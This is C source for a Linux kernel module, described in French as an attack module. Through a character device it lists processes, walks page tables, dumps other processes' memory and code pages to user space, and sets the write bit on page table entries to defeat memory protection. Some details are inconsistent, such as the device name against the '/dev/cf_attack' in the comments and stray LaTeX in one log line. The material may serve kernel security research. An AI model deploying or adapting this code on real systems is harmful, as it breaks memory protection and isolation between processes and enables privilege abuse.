#include <linux/device.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/pid.h>
#include <linux/mm.h>
#include <linux/mmap_lock.h>
#include <linux/cred.h>
#include <asm/pgtable.h>
#include <linux/highmem.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("daniel");
MODULE_DESCRIPTION("LKM d'attaque");
MODULE_VERSION("1.0");

#define DEVICE_NAME "cf2"

static int major_number;
static struct class *cf_attack_class = NULL;
static struct device *cf_attack_device = NULL;

static unsigned char binfmt_buffer[PAGE_SIZE];
static size_t binfmt_buffer_size = 0;



extern void brute_force_pte_write(unsigned long pte_addr, unsigned long virt_addr  , unsigned long new_val);
extern unsigned long getPTE5(unsigned long physicalbase, unsigned long virt_addr) ;
extern unsigned long getPTE4(unsigned long physicalbase, unsigned long virt_addr) ;

static ssize_t device_read(struct file *filp, char __user *buffer, size_t len, loff_t *off);












/*
 * COMMANDE : echo "list" > /dev/cf_attack
 */
void dump_process_list(void)
{
    struct task_struct *task;
    const struct cred *cred;

    printk(KERN_INFO "========================================================================\n");
    printk(KERN_INFO " [CF_ATTACK] CARTOGRAPHIE DES PROCESSUS ACTIFS (RING 0)\n");
    printk(KERN_INFO "========================================================================\n");
    printk(KERN_INFO " %-6s | %-6s | %-20s | %-5s | %-5s | %s\n",
           "PID", "PPID", "COMMANDE", "UID", "EUID", "ETAT");
    printk(KERN_INFO "------------------------------------------------------------------------\n");

    rcu_read_lock();

    for_each_process(task)
    {
        cred = __task_cred(task);
        if (!cred)
            continue;

        printk(KERN_INFO " %-6d | %-6d | %-20s | %-5u | %-5u | %u\n",
               task->pid,
               task->real_parent ? task->real_parent->pid : 0,
               task->comm,
               cred->uid.val,
               cred->euid.val,
               task->__state);
    }

    rcu_read_unlock();

    printk(KERN_INFO "========================================================================\n");
}







void inspect_user_page(struct mm_struct *mm, unsigned long address)
{
    pgd_t *pgd; p4d_t *p4d; pud_t *pud; pmd_t *pmd; pte_t *pte;

    pgd = pgd_offset(mm, address);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) return;
    p4d = p4d_offset(pgd, address);
    if (p4d_none(*p4d) || p4d_bad(*p4d)) return;
    pud = pud_offset(p4d, address);
    if (pud_none(*pud) || pud_bad(*pud)) return;
    pmd = pmd_offset(pud, address);
    if (pmd_none(*pmd) || pmd_bad(*pmd)) return;

    pte = pte_offset_map(pmd, address);
    if (!pte) return;

    if (pte_present(*pte))
    {
        printk(KERN_INFO "    [Page: 0x%lx] -> In MEMORY: Y | %s | %s\n",
               address,
               (pte_write(*pte) ? "WRITE: Y (Data)" : "WRITE: N (Code)"),
               (pte_exec(*pte) ? "EXEC: Y" : "EXEC: N"));
    }

    pte_unmap(pte);
}


/*
 * COMMANDE : echo "PID inspect" > /dev/cf_attack
 */


void inspect_process_memory(pid_t pid)
{
    struct task_struct *task;
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    unsigned long addr;

    printk(KERN_INFO "==================================================\n");
    printk(KERN_INFO "[CF_ATTACK] Lancement de l'inspection pour le PID : %d\n", pid);
    printk(KERN_INFO "==================================================\n");

    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    rcu_read_unlock();

    if (!task)
    {
        printk(KERN_ERR "[CF_ATTACK] Erreur : Impossible de trouver le PID %d\n", pid);
        return;
    }

    mm = task->mm;
    if (!mm)
    {
        printk(KERN_ERR "[CF_ATTACK] Erreur : Pas de mm_struct (Thread Noyau ?)\n");
        return;
    }

    if (!mmget_not_zero(mm))
        return;

    mmap_read_lock(mm);
    for (vma = mm->mmap; vma; vma = vma->vm_next)
    {
        printk(KERN_INFO "  [VMA] Plage: 0x%lx - 0x%lx | Flags: 0x%lx\n",
               vma->vm_start, vma->vm_end, vma->vm_flags);




        /*       
        for (addr = vma->vm_start; addr < vma->vm_end; addr += PAGE_SIZE)
        {
            inspect_user_page(mm, addr);
        }
        */

        // on ne regarde que la premiere page
        addr = vma->vm_start ;
        inspect_user_page(mm, addr);

       
        

    }
    mmap_read_unlock(mm);
    mmput(mm);
    printk(KERN_INFO "[CF_ATTACK] Fin de l'inspection pour le PID %d\n", pid);
}










void analyze_page_content(pte_t pte, unsigned long vaddr)
{
    struct page *pg;
    void *kaddr;
    unsigned char *bytes;
    int i;
    bool is_printable = true;
    bool all_zero = true;

    pg = pte_page(pte);
    if (!pg)
        return;

    kaddr = kmap_local_page(pg);
    if (!kaddr)
        return;

    bytes = (unsigned char *)kaddr;

    for (i = 0; i < 16; i++)
    {
        if (bytes[i] != 0x00)
        {
            all_zero = false;
        }
        if ((bytes[i] < 32 || bytes[i] > 126) && bytes[i] != '\n' && bytes[i] != '\r' && bytes[i] != '\0')
        {
            is_printable = false;
        }
    }

    if (all_zero)
    {
        printk(KERN_INFO "      [Contenu] -> PAGE VIERGE (Zéros)\n");
    }
    else if (bytes[0] == 0x7f && bytes[1] == 'E' && bytes[2] == 'L' && bytes[3] == 'F')
    {
        printk(KERN_INFO "      [Contenu] -> CRITIQUE : En-tête ELF détecté !\n");
    }
    else if (is_printable && bytes[0] != '\0')
    {
        char text_dump[33];
        snprintf(text_dump, sizeof(text_dump), "%s", (char *)bytes);
        printk(KERN_INFO "      [Contenu] -> TEXTE / STRING : \"%s...\"\n", text_dump);
    }
    else
    {
        printk(KERN_INFO "      [Contenu] -> DONNÉES BRUTES : %02x %02x %02x %02x %02x %02x %02x %02x...\n",
               bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5], bytes[6], bytes[7]);
    }

    kunmap_local(kaddr);
}



/*
 * COMMANDE : echo "PID addr inspect" > /dev/cf_attack
 */



void inspect_single_process_page(pid_t pid, unsigned long target_addr)
{
    struct task_struct *task;
    struct mm_struct *mm;
    pgd_t *pgd; p4d_t *p4d; pud_t *pud; pmd_t *pmd; pte_t *pte;

    printk(KERN_INFO "==================================================\n");
    printk(KERN_INFO "[CF_ATTACK] Inspection ciblée : PID %d @ 0x%lx\n", pid, target_addr);
    printk(KERN_INFO "==================================================\n");

    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    rcu_read_unlock();

    if (!task)
    {
        printk(KERN_ERR "[CF_ATTACK] Erreur : Impossible de trouver le PID %d\n", pid);
        return;
    }

    mm = task->mm;
    if (!mm)
    {
        printk(KERN_ERR "[CF_ATTACK] Erreur : Pas de mm_struct (Thread Noyau ?)\n");
        return;
    }

    if (!mmget_not_zero(mm))
        return;

    mmap_read_lock(mm);

    pgd = pgd_offset(mm, target_addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) { printk(KERN_ERR "  [-] PGD invalide\n"); goto out; }

    p4d = p4d_offset(pgd, target_addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d)) { printk(KERN_ERR "  [-] P4D invalide\n"); goto out; }

    pud = pud_offset(p4d, target_addr);
    if (pud_none(*pud) || pud_bad(*pud)) { printk(KERN_ERR "  [-] PUD invalide\n"); goto out; }

    pmd = pmd_offset(pud, target_addr);
    if (pmd_none(*pmd) || pmd_bad(*pmd)) { printk(KERN_ERR "  [-] PMD invalide\n"); goto out; }

    pte = pte_offset_map(pmd, target_addr);
    if (!pte)
    {
        printk(KERN_ERR "  [-] PTE invalide\n");
        goto out;
    }

    if (pte_present(*pte))
    {
        printk(KERN_INFO "    [Page: 0x%lx] -> In MEMORY: OUI | %s | %s\n",
               target_addr,
               (pte_write(*pte) ? "WRITE: OUI (Data)" : "WRITE: NON (Code)"),
               (pte_exec(*pte) ? "EXEC: OUI" : "EXEC: NON"));

        analyze_page_content(*pte, target_addr);
    }
    else
    {
        printk(KERN_WARNING "  [-] Page non présente en RAM physique.\n");
    }

    pte_unmap(pte);

out:
    mmap_read_unlock(mm);
    mmput(mm);
}


/*

 * COMMANDE : echo "PID disasm" > /dev/cf_attack

 * Extraction complète de la page de code pointée par mm->start_code
 */
void disassemble_process_entry(pid_t pid)
{
    struct task_struct *task;
    struct mm_struct *mm;
    unsigned long entry_addr;
    pgd_t *pgd; p4d_t *p4d; pud_t *pud; pmd_t *pmd; pte_t *pte;
    struct page *pg;
    void *kaddr;
    unsigned char *page_start_ptr;

    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    rcu_read_unlock();

    if (!task || !task->mm)
    {
        printk(KERN_ERR "[CF_ATTACK] Impossible d'analyser ce PID.\n");
        return;
    }

    mm = task->mm;
    if (!mmget_not_zero(mm))
        return;

    mmap_read_lock(mm);

    entry_addr = mm->start_code;
    printk(KERN_INFO "==================================================\n");
    printk(KERN_INFO "[CF_ATTACK] ENREGISTREMENT PAGE DE CODE D'ENTRÉE : 0x%lx\n", entry_addr);
    printk(KERN_INFO "==================================================\n");

    pgd = pgd_offset(mm, entry_addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) goto out;
    p4d = p4d_offset(pgd, entry_addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d)) goto out;
    pud = pud_offset(p4d, entry_addr);
    if (pud_none(*pud) || pud_bad(*pud)) goto out;
    pmd = pmd_offset(pud, entry_addr);
    if (pmd_none(*pmd) || pmd_bad(*pmd)) goto out;
    pte = pte_offset_map(pmd, entry_addr);
    if (!pte) goto out;

    if (pte_present(*pte))
    {
        pg = pte_page(*pte);
        if (pg)
        {
            kaddr = kmap_local_page(pg);
            if (kaddr)
            {
                // Alignement sur la frontière de la page pour extraire les 4096 octets complets
                page_start_ptr = (unsigned char *)kaddr;
                
                // Copie globale de la page physique de code vers le canal binaire utilisateur
                memcpy(binfmt_buffer, page_start_ptr, PAGE_SIZE);
                binfmt_buffer_size = PAGE_SIZE; 

                printk(KERN_INFO "[CF_ATTACK] Succès : Page complète ($4\\text{ Ko}$) extraite dans le canal de lecture.\n");

                kunmap_local(kaddr);
            }
        }
    }
    else
    {
        printk(KERN_WARNING "[CF_ATTACK] La page de code demandée n'est pas résidente en RAM.\n");
    }

    pte_unmap(pte);

out:
    mmap_read_unlock(mm);
    mmput(mm);
}















/**************************************************************************************************
 * 
 * 
 * 
 *  Fonctions d'attaque
 * 
 * 
 * 
 **************************************************************************************************/
void print_pte_flags(unsigned long pte_val) {
    printk(KERN_INFO "[CF_ATTACK] PTE Flags: [P:%d | RW:%d | US:%d | PWT:%d | PCD:%d | A:%d | D:%d | PS:%d | PAT:%d | G:%d | NX:%d]\n",
           (int)(pte_val & 0x001),         // P (Present)
           (int)((pte_val >> 1) & 0x001),  // R/W (Read/Write)
           (int)((pte_val >> 2) & 0x001),  // U/S (User/Supervisor)
           (int)((pte_val >> 3) & 0x001),  // PWT (Page Write-Through)
           (int)((pte_val >> 4) & 0x001),  // PCD (Page Cache Disable)
           (int)((pte_val >> 5) & 0x001),  // A (Accessed)
           (int)((pte_val >> 6) & 0x001),  // D (Dirty)
           (int)((pte_val >> 7) & 0x001),  // PS (Page Size)
           (int)((pte_val >> 8) & 0x001),  // PAT
           (int)((pte_val >> 9) & 0x001),  // G (Global)
           (int)((pte_val >> 63) & 0x001)  // NX (No-Execute, bit 63)
    );
}

 void modify_page_permissions(unsigned long target_virt_addr) {
    unsigned long new_value, check_val;
    unsigned long pte_addr;
    unsigned long old_val ;

    // 1. Détection dynamique du mode de pagination et appel de la bonne fonction
    if (pgtable_l5_enabled()) {
        pte_addr = getPTE5((unsigned long)__va(0), target_virt_addr);
    } else {
        pte_addr = getPTE4((unsigned long)__va(0), target_virt_addr);
    }

    // Sécurité: vérifier si l'adresse retournée est valide
    if (!pte_addr) {
        printk(KERN_ERR "[CF_ATTACK] Erreur: impossible de localiser la PTE\n");
        return;
    }

    old_val = *(unsigned long *)pte_addr;

    print_pte_flags(old_val) ;


    // 2. Créer la nouvelle valeur
    // Ajout du bit R/W (bit 1)
    new_value = old_val | (1UL << 1); 

    print_pte_flags(new_value) ;

    brute_force_pte_write(pte_addr, target_virt_addr, new_value);

    // 3. Vérification
    check_val = *(unsigned long *)pte_addr;
    printk(KERN_INFO "[CF_ATTACK] Verif: avant=0x%lx, apres=0x%lx, attendu=0x%lx\n", 
           old_val, check_val, new_value);
}














/****************************************************************************************************************** 


pour recevoir et transmettre de l'info 


*******************************************************************************************************************/




static ssize_t device_write(struct file *filp, const char __user *buffer, size_t len, loff_t *off)
{
    char k_buf[96];
    int target_pid = 0;
    char first_token[32];
    char second_token[32];
    unsigned long target_addr = 0;
    int parsed_args;

    if (len > sizeof(k_buf) - 1)
        return -EINVAL;

    if (copy_from_user(k_buf, buffer, len))
        return -EFAULT;
    k_buf[len] = '\0';

    parsed_args = sscanf(k_buf, "%31s %31s %lx", first_token, second_token, &target_addr);

    if (parsed_args >= 1)
    {
        if (strcmp(first_token, "list") == 0)
        {
            dump_process_list();
            return len;
        }

        if (kstrtoint(first_token, 10, &target_pid) == 0)
        {
            if (parsed_args == 2 && strcmp(second_token, "inspect") == 0)
            {
                inspect_process_memory((pid_t)target_pid);
            }
            else if (parsed_args == 2 && strcmp(second_token, "disasm") == 0)
            {
                disassemble_process_entry((pid_t)target_pid);
            }
            else if (parsed_args == 3 && strcmp(second_token, "inspect") == 0)
            {
                inspect_single_process_page((pid_t)target_pid, target_addr);
            }
             else if (parsed_args == 3 && strcmp(second_token, "modify") == 0)
            {
                modify_page_permissions(target_addr) ;
            }
            else
            {
                printk(KERN_WARNING "[CF_ATTACK] Erreur syntaxe. Formats : 'list', '<PID> inspect', '<PID> disasm' ou '<PID> inspect <0xADRESSE>'\n");
            }
        }
        else
        {
            printk(KERN_WARNING "[CF_ATTACK] Commande inconnue.\n");
        }
    }

    return len;
}



static struct file_operations fops = {
    .read = device_read,   // Liaison de l'API de lecture binaire
    .write = device_write,
    .owner = THIS_MODULE,
};


static ssize_t device_read(struct file *filp, char __user *buffer, size_t len, loff_t *off) {
    size_t bytes_to_send;

    if (*off >= binfmt_buffer_size) {
        return 0; 
    }

    bytes_to_send = binfmt_buffer_size - *off;
    if (bytes_to_send > len) {
        bytes_to_send = len;
    }

    if (copy_to_user(buffer, binfmt_buffer + *off, bytes_to_send)) {
        return -EFAULT;
    }

    *off += bytes_to_send;
    return bytes_to_send;
}











// les fonctions d'initialisation du module


static int __init cf_attack_init(void)
{
    major_number = register_chrdev(0, DEVICE_NAME, &fops);
    if (major_number < 0)
        return major_number;

    cf_attack_class = class_create(THIS_MODULE, DEVICE_NAME);
    if (IS_ERR(cf_attack_class))
    {
        unregister_chrdev(major_number, DEVICE_NAME);
        return PTR_ERR(cf_attack_class);
    }

    cf_attack_device = device_create(cf_attack_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
    if (IS_ERR(cf_attack_device))
    {
        class_destroy(cf_attack_class);
        unregister_chrdev(major_number, DEVICE_NAME);
        return PTR_ERR(cf_attack_device);
    }

    printk(KERN_INFO "[CF_ATTACK] ready on /dev/%s\n", DEVICE_NAME);
    return 0;
}

static void __exit cf_attack_exit(void)
{
    device_destroy(cf_attack_class, MKDEV(major_number, 0));
    class_destroy(cf_attack_class);
    unregister_chrdev(major_number, DEVICE_NAME);
    printk(KERN_INFO "[CF_ATTACK] unloaded.\n");
}

module_init(cf_attack_init);
module_exit(cf_attack_exit);